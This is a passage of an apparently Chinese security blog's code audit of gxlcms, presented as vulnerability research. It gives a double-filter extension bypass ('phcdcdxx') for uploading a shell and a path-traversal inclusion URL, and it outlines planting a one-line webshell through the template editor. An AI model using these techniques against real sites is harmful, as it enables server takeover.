class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_index&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:index:index&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:action&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_index&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:index:index&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_list&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:ting:show&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_list&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:news:show&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_list&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:ting:show&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:news:show&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_content&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:ting:read&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;name|get_small_id_by_name&#125;&#123;id|get_small_id&#125;/&#123;name|gettingidmd&#125;&#123;id|getmd5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_content&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:news:read&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_content&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:ting:read&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:news:read&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_play&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:ting:play&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;name|get_small_id_by_name&#125;&#123;id|get_small_id&#125;/&#123;name|gettingid&#125;&#123;id&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_play&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:ting:play&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_ajax&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:my:show&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_ajax&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:special:read&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_ajax&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:my:show&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:special:read&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_juqing&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:story:read&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;name|get_small_id_by_name&#125;&#123;id|get_small_id&#125;/&#123;name|gettingid&#125;&#123;id&#125;/&#123;name|gettingidmd&#125;&#123;id|getmd5&#125;&#123;p&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_juqing&quot;</span>] * <span class="number">24</span> * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:story:read&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_story&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:story:show&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;dir|gediridmd&#125;&#123;id|getmd5&#125;&#123;p&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_juqing&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:story:show&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_actorshow&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:actor:show&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;\$_SERVER.REQUEST_URI|md5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_actorshow&quot;</span>] * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:actor:show&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="variable">$config</span>[<span class="string">&quot;html_cache_actor&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:actor:read&quot;</span>] = <span class="keyword">array</span>(<span class="string">&quot;&#123;:controller&#125;_&#123;:action&#125;/&#123;name|get_small_id_by_name&#125;&#123;id|get_small_id&#125;/&#123;name|gettingidmd&#125;&#123;id|getmd5&#125;&quot;</span>, <span class="variable">$config</span>[<span class="string">&quot;html_cache_actor&quot;</span>] * <span class="number">24</span> * <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_cache_rules&quot;</span>][<span class="string">&quot;home:actor:read&quot;</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="variable">$config</span>[<span class="string">&quot;url_html&quot;</span>]) &#123;</span><br><span class="line">        @unlink(<span class="string">&quot;./index&quot;</span> . C(<span class="string">&quot;html_file_suffix&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&quot;html_home_suffix&quot;</span>] = <span class="variable">$config</span>[<span class="string">&quot;html_file_suffix&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$config_old</span> = <span class="keyword">require</span> <span class="string">&quot;./Runtime/Conf/config.php&quot;</span>;</span><br><span class="line">    <span class="variable">$config_new</span> = array_merge(<span class="variable">$config_old</span>, <span class="variable">$config</span>);</span><br><span class="line">    arr2file(<span class="string">&quot;./Runtime/Conf/config.php&quot;</span>, <span class="variable">$config_new</span>);</span><br><span class="line">    @unlink(<span class="string">&quot;./Runtime/common~runtime.php&quot;</span>);</span><br><span class="line">    <span class="variable">$gxl_play</span> .= <span class="string">&quot;var gxl_root=\&quot;&quot;</span> . <span class="variable">$config</span>[<span class="string">&quot;site_path&quot;</span>] . <span class="string">&quot;\&quot;;&quot;</span>;</span><br><span class="line">    <span class="variable">$gxl_play</span> .= <span class="string">&quot;var gxl_width=&quot;</span> . <span class="variable">$config</span>[<span class="string">&quot;play_width&quot;</span>] . <span class="string">&quot;;&quot;</span>;</span><br><span class="line">    <span class="variable">$gxl_play</span> .= <span class="string">&quot;var gxl_height=&quot;</span> . <span class="variable">$config</span>[<span class="string">&quot;play_height&quot;</span>] . <span class="string">&quot;;&quot;</span>;</span><br><span class="line">    admin_gxl_hot_key(C(<span class="string">&quot;site_hot&quot;</span>));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;success(<span class="string">&quot;恭喜您，配置信息更新成功！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与函数对应的后台功能截图</p>
+<p><a target="_blank" rel="noopener" href="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg" title="1.jpg"><img src="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg" alt="1.jpg" title="1.jpg"></a></p>
+<p>主要是看这个设置附件上传类型，危害很明显。但这里不能直接添加php后缀，因为有过滤，把”php”, “asp”, “apsx”, “txt”, “asax”, “ascx”, “cdx”, “cer”, “cgi”, “jsp”, “html”, “html”, “htm”等后缀都过滤掉。把这些字符替换为空。这样就很容易绕过了，添加pphphp,就可以绕过。但是，在上传处，还有一次过滤。</p>
+<p>漏洞文件：Lib\Admin\Action\UploadAction.class.php<br>漏洞函数：upload()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div style=\&quot;font-size:12px; height:30px; line-height:30px\&quot;&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$uppath</span> = <span class="string">&quot;./&quot;</span> . str_replace(<span class="keyword">array</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;//&quot;</span>), <span class="string">&quot;&quot;</span>, C(<span class="string">&quot;upload_path&quot;</span>)) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="variable">$uppath_s</span> = <span class="string">&quot;./&quot;</span> . str_replace(<span class="keyword">array</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;//&quot;</span>), <span class="string">&quot;&quot;</span>, C(<span class="string">&quot;upload_path&quot;</span>)) . <span class="string">&quot;-s/&quot;</span>;</span><br><span class="line">    <span class="variable">$sid</span> = trim(<span class="variable">$_POST</span>[<span class="string">&quot;sid&quot;</span>]);</span><br><span class="line">    <span class="variable">$fileback</span> = (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;fileback&quot;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&quot;fileback&quot;</span>]) : <span class="string">&quot;ting_pic&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sid</span>) &#123;</span><br><span class="line">        <span class="variable">$uppath</span> .= <span class="variable">$sid</span> . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="variable">$uppath_s</span> .= <span class="variable">$sid</span> . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        mkdirss(<span class="variable">$uppath</span>);</span><br><span class="line">        mkdirss(<span class="variable">$uppath_s</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$up</span> = <span class="keyword">new</span> \Org\Net\UploadFile();</span><br><span class="line">    <span class="variable">$up</span>-&gt;savePath = <span class="variable">$uppath</span>;</span><br><span class="line">    <span class="variable">$up</span>-&gt;saveRule = uniqid;</span><br><span class="line">    <span class="variable">$up</span>-&gt;uploadReplace = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$upload_class</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;apsx&quot;</span>, <span class="string">&quot;txt&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;cdx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;cgi&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;,,&quot;</span>), <span class="string">&quot;&quot;</span>, strtolower(C(<span class="string">&quot;upload_class&quot;</span>)));</span><br><span class="line">    <span class="variable">$upload_classs</span> = trim(<span class="variable">$upload_class</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">    <span class="variable">$up</span>-&gt;allowExts = explode(<span class="string">&quot;,&quot;</span>, <span class="variable">$upload_classs</span>);</span><br><span class="line">    <span class="variable">$up</span>-&gt;autoSub = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$up</span>-&gt;subType = date;</span><br><span class="line">    <span class="variable">$up</span>-&gt;dateFormat = C(<span class="string">&quot;upload_style&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$up</span>-&gt;upload()) &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="variable">$up</span>-&gt;getErrorMsg();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$error</span> == <span class="string">&quot;上传文件类型不允许&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> .= <span class="string">&quot;，可上传&lt;font color=red&gt;&quot;</span> . <span class="variable">$upload_classs</span> . <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$error</span> . <span class="string">&quot; [&lt;a href=\&quot;?s=Admin-Upload-Show-sid-&quot;</span> . <span class="variable">$sid</span> . <span class="string">&quot;-fileback-&quot;</span> . <span class="variable">$fileback</span> . <span class="string">&quot;\&quot;&gt;重新上传&lt;/a&gt;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadList</span> = <span class="variable">$up</span>-&gt;getUploadFileInfo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&quot;upload_water&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$image</span> = <span class="keyword">new</span> \Think\Image();</span><br><span class="line">        <span class="variable">$image</span>-&gt;open(<span class="variable">$uppath</span> . <span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>])-&gt;water(C(<span class="string">&quot;upload_water_img&quot;</span>), C(<span class="string">&quot;upload_water_pos&quot;</span>), C(<span class="string">&quot;upload_water_pct&quot;</span>))-&gt;save(<span class="variable">$uppath</span> . <span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&quot;upload_thumb&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$thumbdir</span> = substr(<span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>], <span class="number">0</span>, strrpos(<span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>], <span class="string">&quot;/&quot;</span>));</span><br><span class="line">        mkdirss(<span class="variable">$uppath_s</span> . <span class="variable">$thumbdir</span>);</span><br><span class="line">        <span class="variable">$image</span> = <span class="keyword">new</span> \Think\Image();</span><br><span class="line">        <span class="variable">$image</span>-&gt;open(<span class="variable">$uppath</span> . <span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>]);</span><br><span class="line">        <span class="variable">$image</span>-&gt;thumb(C(<span class="string">&quot;upload_thumb_w&quot;</span>), C(<span class="string">&quot;upload_thumb_h&quot;</span>), C(<span class="string">&quot;upload_thumb_pos&quot;</span>))-&gt;save(<span class="variable">$uppath_s</span> . <span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&quot;upload_ftp&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$img</span> = D(<span class="string">&quot;Img&quot;</span>);</span><br><span class="line">        <span class="variable">$img</span>-&gt;ftp_upload(<span class="variable">$sid</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;parent.document.getElementById(&#x27;&quot;</span> . <span class="variable">$fileback</span> . <span class="string">&quot;&#x27;).value=&#x27;&quot;</span> . <span class="variable">$sid</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$uploadList</span>[<span class="number">0</span>][<span class="string">&quot;savename&quot;</span>] . <span class="string">&quot;&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件上传成功　[&lt;a href=\&quot;?s=Admin-Upload-Show-sid-&quot;</span> . <span class="variable">$sid</span> . <span class="string">&quot;-fileback-&quot;</span> . <span class="variable">$fileback</span> . <span class="string">&quot;\&quot;&gt;重新上传&lt;/a&gt;]&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里把”php”, “asp”, “apsx”, “txt”, “asax”, “ascx”, “cdx”, “cer”, “cgi”, “jsp”, “html”, “html”, “htm”这些字符再次过滤为空。</p>
+<p>一共过滤两次，所以在添加附件后缀里添加phcdcdxx，后缀就可以了，就可以直接上传拿到shell了。</p>
+<h4 id="0x05-鸡肋本地包含漏洞"><a href="#0x05-鸡肋本地包含漏洞" class="headerlink" title="0x05 鸡肋本地包含漏洞"></a>0x05 鸡肋本地包含漏洞</h4><p>为什么鸡肋尼？只能包含.html的文件，这个漏洞只能配合后台修改模板后台Getshell（而且只限于老版本）。</p>
+<p>漏洞文件：Lib\Action\Home\MapAction.class.php<br>漏洞函数：show()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$mapname</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) ? trim(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]):<span class="string">&#x27;rss&#x27;</span>;</span><br><span class="line">    <span class="variable">$limit</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;limit&#x27;</span>]) ? intval(<span class="variable">$_GET</span>[<span class="string">&#x27;limit&#x27;</span>]):<span class="number">30</span>;</span><br><span class="line">    <span class="variable">$page</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) ? intval(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;list_map&#x27;</span>,<span class="keyword">$this</span>-&gt;Lable_Maps(<span class="variable">$mapname</span>,<span class="variable">$limit</span>,<span class="variable">$page</span>));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;display(<span class="string">&#x27;./Public/maps/&#x27;</span>.<span class="variable">$mapname</span>.<span class="string">&#x27;.html&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;text/xml&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看控制变量$id，最后用于display()函数中，所以包含的地址是可控的。<br>所以包含.html后缀的文件，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?s=Map-show-id-..\..\Tpl\defalut\Home\my_top</span><br></pre></td></tr></table></figure>
+
+<p>后台还有一个修改模板的功能，编辑之，添一句话，菜刀连之，然Getshell。</p>
+<p><a target="_blank" rel="noopener" href="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.jpg" title="2.jpg"><img src="https://image.lufe1.cn/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.jpg" alt="2.jpg" title="2.jpg"></a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lufe1.cn/2017/09/09/gxlcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="gxlcms代码审计" target="_blank" rel="external">https://lufe1.cn/2017/09/09/gxlcms代码审计/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/lufeirider" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lufeirider" target="_blank"><span class="text-dark">lufei</span><small class="ml-1x">网络安全</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2017/09/17/%E8%B7%AF%E5%BE%84%E5%AD%97%E5%85%B8%E5%88%B6%E4%BD%9C%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="路径字典制作的一些想法与实现"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2017/08/03/RDP%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" title="RDP爆破工具"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2021 lufei@湘ICP备17016147号-1
+        
+        <div class="publishby">
+        	
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
